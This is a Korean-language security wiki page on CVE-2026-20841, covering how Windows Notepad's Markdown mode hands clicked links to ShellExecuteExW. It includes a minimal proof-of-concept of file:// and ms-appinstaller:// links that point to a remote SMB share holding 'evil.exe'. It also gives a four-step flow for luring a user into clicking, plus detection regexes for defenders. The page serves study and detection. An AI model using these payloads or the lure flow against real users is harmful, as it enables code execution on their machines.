# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Markdown 또는 HTML을 렌더링하는 Windows 애플리케이션은 클릭된 대상을 `ShellExecuteExW`에 전달할 수 있습니다. ShellExecute는 등록된 URI scheme과 파일 연결을 디스패치하므로, renderer는 모든 link가 HTTP(S)라고 가정하지 말고 명시적인 allowlist를 사용해야 합니다. 아래의 Notepad 동작은 CVE-2026-20841을 설명하는 것이며 모든 renderer에 일반화해서는 안 됩니다.<sup>[[1]](#references)[[3]](#references)</sup>

## Windows Notepad Markdown mode의 ShellExecuteExW surface
- Notepad는 `sub_1400ED5D0()`의 고정 문자열 비교를 통해 **`.md` extension에 대해서만** Markdown mode를 선택합니다.<sup>[[1]](#references)</sup>
- 지원되는 Markdown link:
- Standard: `[text](target)`
- Autolink: `<target>` (`[target](target)`으로 렌더링됨)이므로 payload와 detection에는 두 syntax가 모두 중요합니다.
- Link click은 `sub_140170F60()`에서 처리되며, 이 함수는 weak filtering을 수행한 후 `ShellExecuteExW`를 호출합니다.
- `ShellExecuteExW`는 HTTP(S)뿐만 아니라 **구성된 모든 protocol handler**로 디스패치합니다.<sup>[[1]](#references)</sup>

### Payload 고려 사항
- Link의 모든 `\\` sequence는 `ShellExecuteExW` 전에 `\`로 **정규화**되므로 UNC/path 구성 및 detection에 영향을 줍니다.
- `.md` 파일은 기본적으로 Notepad에 연결되어 있지 않습니다. 따라서 victim은 여전히 파일을 Notepad에서 열고 link를 클릭해야 하지만, 렌더링된 후에는 link를 클릭할 수 있습니다.
- 위험한 example scheme:<sup>[[1]](#references)</sup>
- 로컬/UNC payload를 실행하는 `file://`.
- App Installer flow를 트리거하는 `ms-appinstaller://`. 로컬에 등록된 다른 scheme도 악용될 수 있습니다.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### 악용 흐름
1. Notepad이 해당 파일을 Markdown으로 렌더링하도록 **`.md` 파일**을 작성합니다.
2. 위험한 URI scheme(`file:`, `ms-appinstaller:` 또는 설치된 handler)을 사용해 링크를 삽입합니다.
3. 파일을 (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB 또는 유사한 방식으로) 전달하고 사용자가 Notepad에서 열도록 유도합니다.
4. 클릭하면 **정규화된 링크**가 `ShellExecuteExW`에 전달되고, 해당 protocol handler가 사용자 context에서 참조된 콘텐츠를 실행합니다.<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- 문서를 전달하는 데 흔히 사용되는 포트/프로토콜을 통해 `.md` 파일이 전송되는지 모니터링합니다: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown 링크(standard 및 autolink)를 파싱하고 **대소문자를 구분하지 않는** `file:` 또는 `ms-appinstaller:`를 찾습니다.
- 원격 resource access를 탐지하기 위한 vendor-guided regexes:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- ZDI가 설명한 공급업체 수정 사항은 허용되는 대상을 로컬 파일과 HTTP(S)로 제한합니다. 등록된 공격 표면은 시스템마다 다르므로, 필요에 따라 설치된 다른 protocol handler에 대한 탐지도 확장해야 합니다.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Windows Notepad의 임의 코드 실행](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
